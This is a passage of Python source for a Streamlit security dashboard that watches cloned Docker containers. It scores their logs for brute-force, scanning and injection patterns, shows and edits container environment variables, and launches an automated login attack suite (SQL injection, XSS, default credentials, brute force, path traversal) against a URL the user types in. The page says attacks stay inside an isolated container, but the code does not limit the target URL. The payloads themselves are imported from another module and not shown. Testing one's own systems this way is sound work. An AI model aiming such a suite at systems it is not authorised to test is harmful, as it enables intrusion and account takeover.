                '<div style="display:inline-flex;align-items:center;gap:6px;'
                'background:#05200e;border:1px solid #16a34a44;border-radius:4px;'
                'padding:3px 10px;font-size:.62rem;color:#4ADE80;margin-bottom:6px;'
                'font-family:JetBrains Mono,monospace">'
                '<span style="animation:log-blink 0.8s infinite;display:inline-block;'
                'width:6px;height:6px;background:#4ADE80;border-radius:50%"></span>'
                '⚡ LIVE — refreshing every 3s · click ⚡ again to stop'
                '</div>',
                unsafe_allow_html=True,
            )
            _time.sleep(3)
            st.session_state.pop("dt_log_cache", None)   # force re-fetch each tick
            st.rerun()

        if do_fetch or "dt_log_cache" not in st.session_state:
            logs = _get_container_logs(result, tail=tail_n)
            st.session_state["dt_log_cache"] = logs
        else:
            logs = st.session_state.get("dt_log_cache", "")

        # ── Crash diagnosis: ModuleNotFoundError quick-fix ────────────────
        if logs:
            missing_mod = _re.search(
                r"ModuleNotFoundError: No module named '([^']+)'", logs
            )
            if missing_mod:
                mod_name = missing_mod.group(1)
                from core.source_clone import _IMPORT_TO_PIP
                pip_pkg = _IMPORT_TO_PIP.get(mod_name, mod_name.replace("_", "-"))
                st.error(
                    f"**Crash detected:** `ModuleNotFoundError: No module named '{mod_name}'`\n\n"
                    f"The container is missing `{pip_pkg}`. "
                    f"Click **Quick Fix** to install it live (no restart needed)."
                )
                fix_col, info_col = st.columns([1, 3])
                with fix_col:
                    if st.button(f"🔧 Quick Fix: pip install {pip_pkg}",
                                 key="dt_log_quickfix", type="primary", use_container_width=True):
                        import subprocess as _sp2
                        with st.spinner(f"Installing {pip_pkg}…"):
                            r2 = _sp2.run(
                                ["docker", "exec", cname, "pip", "install", "--quiet", pip_pkg],
                                capture_output=True, text=True, timeout=120,
                            )
                        if r2.returncode == 0:
                            st.success(f"✅ `{pip_pkg}` installed! Streamlit will auto-reload.")
                            st.info(f"**Permanent fix:** Add `{pip_pkg}` to `requirements.txt`.")
                            st.session_state.pop("dt_log_cache", None)
                            st.rerun()
                        else:
                            st.error(f"Install failed:\n```\n{r2.stderr[:500]}\n```")
                with info_col:
                    st.markdown(
                        f'<div style="padding-top:8px;font-size:0.78rem;color:#475569">'
                        f'Installs live — no restart. Permanent fix: add '
                        f'<code>{pip_pkg}</code> to requirements.txt.</div>',
                        unsafe_allow_html=True,
                    )

        if not logs:
            st.caption("No logs yet — container may have just started.")
            return

        # ── Pass 1: collect all HTTP events for behavioral analysis ───────
        lines = logs.splitlines()
        from collections import defaultdict as _dd
        _ip_total:   dict = _dd(int)   # ip → total requests
        _ip_post:    dict = _dd(int)   # ip → POST count to login-like paths
        _ip_404:     dict = _dd(int)   # ip → 404 count
        _ip_500:     dict = _dd(int)   # ip → 5xx count
        _ip_401:     dict = _dd(int)   # ip → 401/403 count
        _http_events: list = []        # (ip, method, url, status_int) tuples

        for ln in lines:
            m = _HTTP_RE.search(ln)
            if m:
                ip2, method2, url2, status2 = (
                    m.group(1), m.group(3), m.group(4), int(m.group(5))
                )
                _ip_total[ip2] += 1
                if status2 >= 500:          _ip_500[ip2] += 1
                if status2 in (401, 403):   _ip_401[ip2] += 1
                if status2 == 404:          _ip_404[ip2] += 1
                if method2 == "POST" and _re.search(
                    r"/(login|signin|auth|user|session|account|wp-login|admin)",
                    url2, _re.I
                ):
                    _ip_post[ip2] += 1
                _http_events.append((ip2, method2, url2, status2))

        # ── Behavioral threat detection ────────────────────────────────────
        # Thresholds — tuned for typical log window (50-200 lines)
        _BRUTE_THRESH   = 5    # same IP, POST to login path ≥ 5 → brute force
        _FLOOD_THRESH   = 30   # same IP total requests ≥ 30  → flood/DDoS
        _SCAN_THRESH    = 6    # same IP 404s ≥ 6             → recon scan
        _AUTH_THRESH    = 5    # same IP 401/403 ≥ 5          → auth bypass
        _INJ_THRESH     = 3    # same IP 5xx after POST ≥ 3   → injection probe

        _behavioral_threats: list[dict] = []  # {ip, type, label, color, icon, count}

        for ip2 in set(list(_ip_total) + list(_ip_post) + list(_ip_404)):
            if _ip_post[ip2] >= _BRUTE_THRESH:
                _behavioral_threats.append({
                    "ip": ip2, "type": "BruteForce",
                    "label": f"BRUTE FORCE — {_ip_post[ip2]} login attempts",
                    "color": "#FF4466", "icon": "🔨",
                    "count": _ip_post[ip2],
                })
            elif _ip_total[ip2] >= _FLOOD_THRESH:
                _behavioral_threats.append({
                    "ip": ip2, "type": "Flood",
                    "label": f"REQUEST FLOOD — {_ip_total[ip2]} hits",
                    "color": "#FB923C", "icon": "🌊",
                    "count": _ip_total[ip2],
                })
            if _ip_404[ip2] >= _SCAN_THRESH:
                _behavioral_threats.append({
                    "ip": ip2, "type": "ReconScan",
                    "label": f"RECON SCAN — {_ip_404[ip2]} not-found probes",
                    "color": "#38BDF8", "icon": "🔍",
                    "count": _ip_404[ip2],
                })
            if _ip_401[ip2] >= _AUTH_THRESH:
                _behavioral_threats.append({
                    "ip": ip2, "type": "AuthBypass",
                    "label": f"AUTH BYPASS — {_ip_401[ip2]} denied attempts",
                    "color": "#C084FC", "icon": "🔐",
                    "count": _ip_401[ip2],
                })
            if _ip_500[ip2] >= _INJ_THRESH:
                _behavioral_threats.append({
                    "ip": ip2, "type": "InjectionProbe",
                    "label": f"INJECTION PROBE — {_ip_500[ip2]} server errors",
                    "color": "#FBBF24", "icon": "💉",
                    "count": _ip_500[ip2],
                })

        # ── Pass 2: per-line stats + rendered rows ─────────────────────────
        stats = {"total": 0, "clean": 0, "attack": 0, "error": 0, "timeout": 0}
        rows_html: list[str] = []
        # IPs flagged by behavioral analysis
        _flagged_ips = {t["ip"]: t for t in _behavioral_threats}

        for ln in lines:
            safe = ln.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
            m  = _HTTP_RE.search(ln)
            m2 = _HTTP_EMPTY_RE.search(ln) if not m else None

            if m:
                # ── Normal HTTP request ───────────────────────────────────
                ip, _ts, method, url, status = (
                    m.group(1), m.group(2), m.group(3), m.group(4), m.group(5)
                )
                stats["total"] += 1
                url_safe = url.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")
                url_disp = url_safe[:52] + ("…" if len(url) > 52 else "")

                sc = int(status)
                if sc < 300:
                    s_col, s_bg = "#00FF88", "#00ff8808"
                elif sc < 400:
                    s_col, s_bg = "#60A5FA", "#60a5fa08"
                elif sc < 500:
                    s_col, s_bg = "#FFB800", "#ffb80008"
                else:
                    s_col, s_bg = "#FF4466", "#ff446608"
                    stats["error"] += 1

                # ── Verdict: URL signature first, then behavioral flag ────
                verdict_html = ""
                detected = False

                # 1) URL-based attack signature
                for pat, atype, acolor, aicon in _ATTACK_SIGS:
                    if pat.search(url):
                        stats["attack"] += 1
                        detected = True
                        verdict_html = (
                            f'<span style="background:{acolor}18;color:{acolor};'
                            f'border:1px solid {acolor}66;border-radius:3px;'
                            f'padding:1px 6px;font-size:.57rem;font-weight:800;'
                            f'letter-spacing:.06em;animation:log-blink 0.9s infinite">'
                            f'{aicon} {atype}</span>'
                        )
                        break

                # 2) Behavioral flag — this IP was flagged in Pass 1
                if not detected and ip in _flagged_ips:
                    t = _flagged_ips[ip]
                    stats["attack"] += 1
                    detected = True
                    verdict_html = (
                        f'<span style="background:{t["color"]}18;color:{t["color"]};'
                        f'border:1px solid {t["color"]}55;border-radius:3px;'
                        f'padding:1px 6px;font-size:.57rem;font-weight:800;'
                        f'letter-spacing:.06em;animation:log-blink 1.2s infinite">'
                        f'{t["icon"]} {t["type"]}</span>'
                    )

                if not detected:
                    stats["clean"] += 1
                    verdict_html = '<span style="color:#4ADE8088;font-size:.58rem;font-weight:600">● CLEAN</span>'

                m_colors = {"GET":"#38BDF8","POST":"#4ADE80","PUT":"#FFB800",
                            "DELETE":"#FF4466","PATCH":"#C084FC","HEAD":"#94A3B8"}
                m_col = m_colors.get(method, "#94A3B8")
                m_bg  = f"{m_col}12"

                rows_html.append(
                    f'<div style="display:grid;grid-template-columns:95px 48px 1fr 38px 80px;'
                    f'gap:6px;padding:4px 6px;border-left:2px solid {s_col}33;'
                    f'background:{s_bg};margin:1px 0;border-radius:2px;align-items:center">'
                    f'<span style="color:#475569;font-size:.6rem">{ip}</span>'
                    f'<span style="background:{m_bg};color:{m_col};font-size:.58rem;'
                    f'font-weight:700;padding:1px 4px;border-radius:2px;text-align:center">{method}</span>'
                    f'<span style="color:#94A3B8;font-size:.62rem;overflow:hidden;'
                    f'text-overflow:ellipsis;white-space:nowrap">{url_disp}</span>'
                    f'<span style="color:{s_col};font-size:.65rem;font-weight:700;'
                    f'text-align:center">{status}</span>'
                    f'{verdict_html}'
                    f'</div>'
                )

            elif m2:
                # ── Timeout / dropped connection (408, "-" request) ───────
                ip, _ts, status = m2.group(1), m2.group(2), m2.group(3)
                stats["total"] += 1
                stats["timeout"] += 1
                rows_html.append(
                    f'<div style="display:grid;grid-template-columns:95px 48px 1fr 38px 80px;'
                    f'gap:6px;padding:4px 6px;border-left:2px solid #33415533;'
                    f'background:#0f172a;margin:1px 0;border-radius:2px;align-items:center">'
                    f'<span style="color:#64748B;font-size:.6rem">{ip}</span>'
                    f'<span style="color:#64748B;font-size:.58rem;font-weight:700;'
                    f'padding:1px 4px;text-align:center">—</span>'
                    f'<span style="color:#64748B;font-size:.62rem;font-style:italic">connection dropped / timeout</span>'
                    f'<span style="color:#FFB800;font-size:.65rem;font-weight:700;text-align:center">{status}</span>'
                    f'<span style="color:#64748B;font-size:.58rem;font-weight:600">⏱ TIMEOUT</span>'
                    f'</div>'
                )

            else:
                # ── System / app log line ─────────────────────────────────
                ll = ln.lower()
                is_noise = bool(_NOISE_RE.search(ln))

                if is_noise:
                    # Apache/Nginx startup noise — dim but readable
                    rows_html.append(
                        f'<div style="padding:1px 6px;font-size:.55rem;color:#3d5a72;'
                        f'white-space:pre-wrap;line-height:1.4">{safe}</div>'
                    )
                elif any(k in ll for k in ("error","exception","traceback","fatal","critical")):
                    stats["error"] += 1
                    rows_html.append(
                        f'<div style="padding:3px 6px;font-size:.62rem;color:#FF4466;'
                        f'border-left:2px solid #FF4466;background:#ff446608;'
                        f'white-space:pre-wrap;line-height:1.5;margin:1px 0">✖ {safe}</div>'
                    )
                elif any(k in ll for k in ("warn","warning")):
                    rows_html.append(
                        f'<div style="padding:3px 6px;font-size:.62rem;color:#FFB800;'
                        f'border-left:2px solid #FFB800;background:#ffb80008;'
                        f'white-space:pre-wrap;line-height:1.5;margin:1px 0">▲ {safe}</div>'
                    )
                elif any(k in ll for k in ("started","running","ready","listening",
                                           "accepting","success","connected","serving")):
                    rows_html.append(
                        f'<div style="padding:3px 6px;font-size:.62rem;color:#00FF88;'
                        f'border-left:2px solid #00FF88;background:#00ff8808;'
                        f'white-space:pre-wrap;line-height:1.5;margin:1px 0">✔ {safe}</div>'
                    )
                else:
                    rows_html.append(
                        f'<div style="padding:2px 6px;font-size:.6rem;color:#4a6a85;'
                        f'white-space:pre-wrap;line-height:1.4">{safe}</div>'
                    )

        # ── Behavioral threat alert banners ───────────────────────────────
        if _behavioral_threats:
            threat_html = (
                '<style>@keyframes log-blink{0%,100%{opacity:1}50%{opacity:.35}}'
                '@keyframes threat-slide{from{transform:translateX(-6px);opacity:0}'
                'to{transform:translateX(0);opacity:1}}</style>'
                '<div style="margin-bottom:8px;font-family:JetBrains Mono,monospace">'
                '<div style="font-size:.58rem;color:#475569;letter-spacing:.12em;'
                'margin-bottom:4px">⚠ BEHAVIORAL THREATS DETECTED</div>'
            )
            for t in _behavioral_threats:
                c = t["color"]
                threat_html += (
                    f'<div style="display:flex;align-items:center;gap:10px;'
                    f'background:{c}12;border:1px solid {c}44;border-left:3px solid {c};'
                    f'border-radius:4px;padding:7px 12px;margin-bottom:4px;'
                    f'animation:threat-slide 0.3s ease">'
                    f'<span style="font-size:1.1rem">{t["icon"]}</span>'
                    f'<div style="flex:1">'
                    f'<span style="color:{c};font-size:.65rem;font-weight:800;'
                    f'letter-spacing:.08em">{t["type"].upper()}</span>'
                    f'<span style="color:#64748B;font-size:.62rem;margin-left:8px">'
                    f'{t["label"]}</span>'
                    f'</div>'
                    f'<span style="background:{c}22;color:{c};border:1px solid {c}55;'
                    f'border-radius:3px;padding:1px 8px;font-size:.58rem;font-weight:700;'
                    f'animation:log-blink 0.8s infinite">SOURCE: {t["ip"]}</span>'
                    f'</div>'
                )
            threat_html += '</div>'
            st.markdown(threat_html, unsafe_allow_html=True)

        # ── Stats bar ─────────────────────────────────────────────────────
        a_glow = "box-shadow:0 0 12px #FF446688;" if stats["attack"] > 0 else ""
        a_anim = "animation:log-blink 0.7s infinite;" if stats["attack"] > 0 else ""
        st.markdown(
            '<style>'
            '@keyframes log-blink{0%,100%{opacity:1}50%{opacity:.35}}'
            '</style>'
            '<div style="display:grid;grid-template-columns:repeat(5,1fr);gap:3px;'
            f'margin-bottom:8px;font-family:JetBrains Mono,monospace">'

            f'<div style="background:#0d1829;border:1px solid #1e4976;border-radius:6px;'
            f'padding:8px;text-align:center">'
            f'<div style="color:#8BA8C4;font-size:.55rem;letter-spacing:.1em">📡 TOTAL</div>'
            f'<div style="color:#60A5FA;font-weight:800;font-size:1.3rem;line-height:1.2">{stats["total"]}</div>'
            f'</div>'

            f'<div style="background:#051a0d;border:1px solid #1a6b3a;border-radius:6px;'
            f'padding:8px;text-align:center">'
            f'<div style="color:#6dba8f;font-size:.55rem;letter-spacing:.1em">✅ CLEAN</div>'
            f'<div style="color:#00FF88;font-weight:800;font-size:1.3rem;line-height:1.2">{stats["clean"]}</div>'
            f'</div>'

            f'<div style="background:#1a0508;border:1px solid #7f1d1d;border-radius:6px;'
            f'padding:8px;text-align:center;{a_glow}{a_anim}">'
            f'<div style="color:#C87B8A;font-size:.55rem;letter-spacing:.1em">🚨 ATTACKS</div>'
            f'<div style="color:#FF4466;font-weight:800;font-size:1.3rem;line-height:1.2">{stats["attack"]}</div>'
            f'</div>'

            f'<div style="background:#1a1000;border:1px solid #78350f;border-radius:6px;'
            f'padding:8px;text-align:center">'
            f'<div style="color:#C8A44A;font-size:.55rem;letter-spacing:.1em">❌ ERRORS</div>'
            f'<div style="color:#FFB800;font-weight:800;font-size:1.3rem;line-height:1.2">{stats["error"]}</div>'
            f'</div>'

            f'<div style="background:#0d1829;border:1px solid #1e4976;border-radius:6px;'
            f'padding:8px;text-align:center">'
            f'<div style="color:#8BA8C4;font-size:.55rem;letter-spacing:.1em">⏱ TIMEOUT</div>'
            f'<div style="color:#94A3B8;font-weight:800;font-size:1.3rem;line-height:1.2">{stats["timeout"]}</div>'
            f'</div>'

            f'</div>',
            unsafe_allow_html=True,
        )

        # ── Terminal with annotated rows ───────────────────────────────────
        header = (
            '<div style="display:grid;grid-template-columns:95px 48px 1fr 38px 80px;'
            'gap:6px;padding:4px 6px 8px;border-bottom:1px solid #1e4976;'
            'margin-bottom:3px;font-size:.55rem;color:#8BA8C4;letter-spacing:.1em">'
            '<span>IP ADDRESS</span><span>METHOD</span><span>REQUEST URL</span>'
            '<span style="text-align:center">CODE</span><span>VERDICT</span>'
            '</div>'
        )
        st.markdown(
            '<div style="background:#0a1628;padding:12px 14px;border-radius:8px;'
            'border:1px solid #1e3a5f;max-height:420px;overflow-y:auto;'
            'font-family:JetBrains Mono,monospace">'
            + header
            + "\n".join(rows_html)
            + "</div>",
            unsafe_allow_html=True,
        )


def _render_env_manager(result: dict) -> None:
    """Show + edit environment variables on the running container."""
    import subprocess as _sp
    cname = result.get("container_name", "")
    if not cname:
        return

    with st.expander("⚙️ Environment Variables", expanded=False):
        # Read current env from the container
        r = _sp.run(
            ["docker", "exec", cname, "env"],
            capture_output=True, text=True, timeout=10,
        )
        current_env: dict[str, str] = {}
        if r.returncode == 0:
            for line in r.stdout.splitlines():
                if "=" in line:
                    k, _, v = line.partition("=")
                    current_env[k.strip()] = v.strip()

        # Show current env (collapsible table)
        if current_env:
            rows = "".join(
                f'<tr><td style="font-family:JetBrains Mono,monospace;font-size:0.7rem;'
                f'color:#0284C7;padding:3px 10px 3px 0;white-space:nowrap">{k}</td>'
                f'<td style="font-family:JetBrains Mono,monospace;font-size:0.7rem;'
                f'color:#334155;padding:3px 0;word-break:break-all">{v[:80]}</td></tr>'
                for k, v in sorted(current_env.items())
            )
            st.markdown(
                f'<div style="max-height:180px;overflow-y:auto;border:1px solid #E2E8F0;'
                f'border-radius:6px;padding:8px 12px">'
                f'<table style="width:100%;border-collapse:collapse">{rows}</table></div>',
                unsafe_allow_html=True,
            )
        else:
            st.caption("Could not read container env — may not be running.")

        st.markdown(
            '<div style="font-family:Inter,sans-serif;font-size:0.78rem;color:#475569;'
            'margin:10px 0 4px"><b>Add / override environment variable:</b></div>',
            unsafe_allow_html=True,
        )
        ev_col1, ev_col2, ev_col3 = st.columns([2, 3, 1])
        with ev_col1:
            new_key = st.text_input("Key", placeholder="DATABASE_URL", key="dt_env_key",
                                    label_visibility="collapsed")
        with ev_col2:
            new_val = st.text_input("Value", placeholder="postgresql://user:pass@host/db",
                                    key="dt_env_val", label_visibility="collapsed")
        with ev_col3:
            apply_env = st.button("Apply", key="dt_env_apply", type="primary",
                                  use_container_width=True)

        if apply_env and new_key:
            with st.spinner(f"Applying {new_key}… (container restart)"):
                try:
                    import docker as _dk, time as _t
                    client = _dk.from_env()
                    ctr = client.containers.get(cname)

                    # Safely get image — prefer tag, fall back to ID
                    img = ctr.image
                    image_ref = (img.tags[0] if img.tags else img.id)

                    # Reconstruct port mapping from the live container
                    ports_map = {}
                    for cport, hbinds in (ctr.ports or {}).items():
                        if hbinds:
                            ports_map[cport] = int(hbinds[0]["HostPort"])

                    # Reconstruct volumes from the live container
                    mounts = []
                    for m in (ctr.attrs.get("Mounts") or []):
                        if m.get("Type") == "bind":
                            mounts.append(
                                f'{m["Source"]}:{m["Destination"]}'
                                + (":rw" if m.get("RW") else ":ro")
                            )

                    # Read original labels for network + clone metadata
                    labels = ctr.labels or {}
                    net = labels.get("created_by_net",
                          getattr(__import__("config").CFG,
                                  "DOCKER_TWIN_NETWORK", "aidtctm_twin_net"))

                    # Merge env: strip old value of this key, append new
                    env_list = [f"{k}={v}" for k, v in current_env.items()
                                if k != new_key]
                    env_list.append(f"{new_key}={new_val}")

                    ctr.stop(timeout=8)
                    ctr.remove()

                    run_kw: dict = dict(
                        image=image_ref,
                        detach=True,
                        name=cname,
                        network=net,
                        environment=env_list,
                        labels=labels,
                        restart_policy={"Name": "unless-stopped"},
                        mem_limit="1g",
                        cpu_quota=50000,
                        cpu_period=100000,
                        security_opt=["no-new-privileges"],
                    )
                    if ports_map:
                        run_kw["ports"] = ports_map
                    if mounts:
                        run_kw["volumes"] = mounts

                    client.containers.run(**run_kw)
                    _t.sleep(2)
                    st.success(f"✅ `{new_key}` applied — container restarted")
                    st.session_state.pop("dt_log_cache", None)
                    _t.sleep(1)
                    st.rerun()
                except Exception as exc:
                    st.error(f"Failed to apply env var: {exc}")

        st.caption(
            "⚠️ Env vars set here persist only until the container is destroyed. "
            "Add them to your app's source code for permanent use."
        )


_ATTACK_CATEGORIES = {
    "sqli":     ("💉", "SQL Injection",      "#DC2626", "#FEF2F2"),
    "xss":      ("🪝", "XSS",                "#EA580C", "#FFF7ED"),
    "creds":    ("🔑", "Default Credentials", "#7C3AED", "#FAF5FF"),
    "brute":    ("🔨", "Brute Force",         "#B91C1C", "#FEF2F2"),
    "header":   ("📡", "Header Injection",    "#0C4A6E", "#F0F9FF"),
    "traversal":("📂", "Path Traversal",      "#0F766E", "#F0FDFA"),
}

_VERDICT_COLOR = {
    "CRITICAL": "#DC2626", "HIGH": "#EA580C",
    "MEDIUM": "#D97706",   "SECURED": "#16A34A",
    "INFO": "#0284C7",     "TIMEOUT": "#94A3B8",
}


_PCAP_CSS = """
<style>
@keyframes las-pulse{0%,100%{opacity:1}50%{opacity:.4}}
@keyframes las-slide{from{transform:translateX(-6px);opacity:0}to{transform:translateX(0);opacity:1}}
.las-term{background:#0B1220;border-radius:10px;padding:12px 14px;
          font-family:'JetBrains Mono','Fira Code',monospace;font-size:.68rem;
          border:1px solid #1E3A5F;box-shadow:0 0 20px rgba(2,132,199,.15)}
.las-row{animation:las-slide .18s ease;margin:2px 0;line-height:1.7;white-space:pre-wrap;word-break:break-all}
.las-req{color:#60A5FA}.las-body{color:#94A3B8}.las-sep{color:#1E3A5F}
.las-crit{color:#F87171;font-weight:700;text-shadow:0 0 8px rgba(248,113,113,.5)}
.las-high{color:#FB923C;font-weight:700}
.las-med{color:#FBBF24}
.las-ok{color:#4ADE80;font-weight:700;text-shadow:0 0 6px rgba(74,222,128,.4)}
.las-info{color:#67E8F9}
.las-dim{color:#475569}
.las-blink{animation:las-pulse 1s infinite;display:inline-block}
</style>
"""


def _login_pcap_html(ev: dict) -> str:
    """Render one attack event as a packet-capture terminal row."""
    v      = ev.get("verdict", "INFO")
    pl     = (ev.get("payload") or ev.get("username","") or "")[:55]
    what   = ev.get("what", "")
    detail = ev.get("detail", "")
    code   = ev.get("status_code")
    cat    = ev.get("category", "")
    method = "POST" if cat in ("sqli","xss","creds","brute") else "GET/POST"
    url_hint = "/login" if cat in ("sqli","xss","creds","brute") else "/…"

    # Verdict styling
    vc = {"CRITICAL":"las-crit","HIGH":"las-high","MEDIUM":"las-med",
          "SECURED":"las-ok","INFO":"las-info","TIMEOUT":"las-dim"}.get(v,"las-dim")
    icon = {"CRITICAL":"⚡","HIGH":"⚠","MEDIUM":"◆","SECURED":"✓","TIMEOUT":"◌"}.get(v,"·")

    code_str = f" HTTP {code}" if code else ""
    verdict_line = f'<span class="{vc}">{icon} {v}{code_str}</span>'

    req_line = (
        f'<span class="las-req">→ {method} {url_hint}</span>'
        f'<span class="las-body">  {pl}</span>'
    )
    detail_line = f'<span class="las-dim">  {detail[:80]}</span>' if detail else ""
    what_line   = f'<span class="las-dim">  # {what[:70]}</span>'

    return (
        f'<div class="las-row">'
        f'{req_line}\n'
        f'{verdict_line}\n'
        f'{what_line}'
        f'{chr(10)+detail_line if detail_line else ""}'
        f'</div>'
        f'<div class="las-sep las-row">{"─"*60}</div>'
    )


def _login_evt_html(ev: dict) -> str:
    """Compact non-terminal event card (used in log expander)."""
    v     = ev.get("verdict", "INFO")
    color = _VERDICT_COLOR.get(v, "#94A3B8")
    pl    = (ev.get("payload") or ev.get("username","") or "")[:60]
    what  = ev.get("what", "")
    detail = ev.get("detail", "")
    code  = f" HTTP {ev['status_code']}" if ev.get("status_code") else ""
    bg    = "#FEF2F2" if v in ("CRITICAL", "HIGH") else (
            "#F0FDF4" if v == "SECURED" else "#F8FAFC")
    return (
        f'<div style="border-left:3px solid {color};background:{bg};'
        f'padding:6px 10px;margin:2px 0;border-radius:0 5px 5px 0">'
        f'<span style="font-size:.68rem;font-weight:700;color:{color};'
        f'letter-spacing:.05em">{v}{code}</span> '
        f'<code style="font-size:.68rem;color:#1E293B;background:rgba(0,0,0,.05);'
        f'padding:1px 5px;border-radius:3px">{pl}</code> '
        f'<span style="font-size:.68rem;color:#64748B">{what[:50]}</span>'
        f'{"<br><span style=font-size:.66rem;color:#94A3B8;font-style:italic>" + detail[:70] + "</span>" if detail else ""}'
        f'</div>'
    )


def _render_login_attack_suite(state: dict, result: dict) -> None:
    """Full login-page attack suite: SQLi + XSS + default creds + brute + headers + traversal."""
    from core.login_attack_suite import (
        discover_login_endpoint,
        run_sqli_attacks, run_xss_attacks, run_default_creds,
        run_brute_force, run_header_attacks, run_path_traversal,
        score_results,
        SQLI_PAYLOADS, XSS_PAYLOADS, DEFAULT_CREDS, BRUTE_FORCE_PAYLOADS,
        HEADER_PAYLOADS, PATH_TRAVERSAL,
    )
    base_url = result.get("url", "")
    if not base_url:
        return

    st.markdown(_sec_header("attack", "Login Page Attack Suite"), unsafe_allow_html=True)
    st.markdown(
        '<div style="background:linear-gradient(135deg,#FFF1F2,#FEF2F2);'
        'border:1px solid #FCA5A5;border-radius:12px;padding:14px 18px;margin-bottom:14px">'
        '<div style="font-family:Inter,sans-serif;font-size:0.86rem;color:#9F1239;font-weight:700">'
        '🎯 Real HTTP attacks against the live clone login page</div>'
        '<div style="font-family:Inter,sans-serif;font-size:0.74rem;color:#475569;margin-top:5px;line-height:1.6">'
        '<b>6 categories × 30 payloads = 180 real probes.</b> '
        'Finds the login endpoint automatically, then fires all attacks. '
        'Verdict: <b style="color:#DC2626">CRITICAL/HIGH</b> = app hacked · '
        '<b style="color:#16A34A">SECURED</b> = attack blocked. '
        'All attacks run inside the isolated Docker container — no external traffic.</div>'
        '</div>',
        unsafe_allow_html=True,
    )

    # ── Step 1: discover login endpoint ──────────────────────────────
    ep_key = f"login_ep_{state.get('job_id','')}"
    if ep_key not in st.session_state:

        # ── Vulnerable Demo deploy helper ──────────────────────────
        DEMO_NAME = "aidtctm_vuln_demo"
        DEMO_PORT = 8102
        _demo_status_key = "las_demo_status"

        # Check if already running
        import subprocess as _sp
        _demo_chk = _sp.run(
            ["docker", "inspect", "--format", "{{.State.Running}}", DEMO_NAME],
            capture_output=True, text=True
        )
        _demo_running = _demo_chk.stdout.strip() == "true"

        if _demo_running:
            st.success(
                f"🎯 **Vulnerable Flask Demo is running** at "
                f"[http://localhost:{DEMO_PORT}/login](http://localhost:{DEMO_PORT}/login) — "
                f"use that URL below to attack it!"
            )
        else:
            with st.expander("🎯 Don't have a target? Deploy the Vulnerable Flask Demo", expanded=False):
                st.markdown(
                    '<div style="font-family:Inter,sans-serif;font-size:0.78rem;color:#64748B;'
                    'margin-bottom:10px;line-height:1.6">'
                    'Built-in intentionally vulnerable Flask app — SQLi, XSS, no CSRF, '
                    'no rate-limit, hardcoded credentials. '
                    'Runs at <b>localhost:8102/login</b>. Safe, isolated Docker container.</div>',
                    unsafe_allow_html=True,
                )
                if st.button("🚀 Start Vulnerable Demo Target", key="las_deploy_demo", type="primary"):
                    with st.spinner("Building vulnerable Flask demo…"):
                        import tempfile, os as _os
                        _demo_src = _os.path.join(
                            _os.path.dirname(_os.path.dirname(__file__)),
                            "data", "sample_targets", "vulnerable_login"
                        )
                        # Build image
                        _build = _sp.run(
                            ["docker", "build", "-t", DEMO_NAME, _demo_src],
                            capture_output=True, text=True
                        )
                        if _build.returncode != 0:
                            st.error(f"Build failed:\n```\n{_build.stderr[-800:]}\n```")
                        else:
                            # Stop old if any
                            _sp.run(["docker", "rm", "-f", DEMO_NAME],
                                    capture_output=True)
                            _run = _sp.run(
                                ["docker", "run", "-d", "--name", DEMO_NAME,
                                 "-p", f"{DEMO_PORT}:5000", DEMO_NAME],
                                capture_output=True, text=True
                            )
                            if _run.returncode == 0:
                                st.success(
                                    f"✅ Demo running at **http://localhost:{DEMO_PORT}/login**\n\n"
                                    f"Enter that URL in the box below and click **Find & Attack**!"
                                )
                                st.session_state[_demo_status_key] = f"http://localhost:{DEMO_PORT}/login"
                                st.rerun()
                            else:
                                st.error(f"Run failed:\n```\n{_run.stderr}\n```")

        # Pre-fill: if demo was just deployed, use that URL
        _demo_prefill = st.session_state.get(_demo_status_key, "")

        # Pre-fill smart default: base_url already ends in /login → use it,
        # otherwise append /login as first guess
        _base = base_url.rstrip("/")
        if _demo_prefill:
            _default_url = _demo_prefill
        elif any(base_url.rstrip("/").endswith(p) for p in
               ("/login", "/signin", "/auth", "/login.php")):
            _default_url = base_url.rstrip("/")
        else:
            _default_url = _base + "/login"

        d_col, m_col = st.columns([3, 1])
        with d_col:
            manual_url = st.text_input(
                "Login page URL",
                value=_default_url,           # ← pre-filled, not just placeholder
                key="las_manual_url",
                label_visibility="collapsed",
            )
        with m_col:
            if st.button("🔍 Find & Attack", key="las_discover", use_container_width=True, type="primary"):
                target_url = manual_url.strip() or _default_url
                with st.spinner("Probing login page…"):
                    ep            = None
                    _is_streamlit = False
                    _err_hint     = ""
                    try:
                        import requests as _rq
                        r    = _rq.get(target_url, timeout=7, allow_redirects=True)
                        body = r.text
                        bl   = body.lower()

                        # ── Detect Streamlit SPA shell ──
                        # Streamlit returns a JS bundle page; no real <form> is in
                        # the initial HTML — the widget tree is rendered via WebSocket.
                        if ("streamlit" in bl and
                                ("<title>streamlit" in bl or
                                 "/_stcore/stream" in bl or
                                 "window.prerenderReady" in bl)):
                            _is_streamlit = True

                        elif r.status_code == 200:
                            # Has any sign of a login form?
                            if any(k in bl for k in ("password", "passwd",
                                                     "input", "signin", "sign in",
                                                     "login", "<form")):
                                from core.login_attack_suite import _guess_fields
                                fields = _guess_fields(body)
                                ep = {
                                    "url":    target_url,
                                    "fields": fields or ("username", "password"),
                                    "method": "POST",
                                    "found_path": "(direct)",
                                }
                            else:
                                _err_hint = f"Page returned 200 but no form/password field found. It may be a React SPA — check in browser."
                        else:
                            _err_hint = f"Server returned HTTP {r.status_code} for that URL."

                    except Exception as _ex:
                        _err_hint = f"Could not reach URL: {_ex}"

                    # Fallback 1 — common path scan
                    if not ep and not _is_streamlit and not _err_hint:
                        ep = discover_login_endpoint(_base)

                    # Fallback 2 — trust the URL blindly (user knows best)
                    if not ep and not _is_streamlit:
                        ep = {
                            "url":    target_url,
                            "fields": ("username", "password"),
                            "method": "POST",
                            "found_path": "(assumed — no form detected)",
                        }

                # Show result outside spinner
                if _is_streamlit:
                    st.warning(
                        "⚠️ **Streamlit app detected** — Streamlit login runs via WebSocket, "
                        "not an HTML `<form>` POST. HTTP-based attacks won't work here.\n\n"
                        "**What to do:**\n"
                        "- Type `http://localhost:8102/login` in the URL box above\n"
                        "- The **Vulnerable Flask Demo** is running there (real SQLi/XSS form)\n"
                        "- Or scroll up and click **🎯 Deploy Vulnerable Flask Demo** first"
                    )
                elif ep:
                    st.session_state[ep_key] = ep
                    st.rerun()
                else:
                    st.error(
                        f"❌ Login page not reachable.\n\n"
                        f"{_err_hint}\n\n"
                        "**Check:** container running · correct port · URL has `/login` path"
                    )
        return

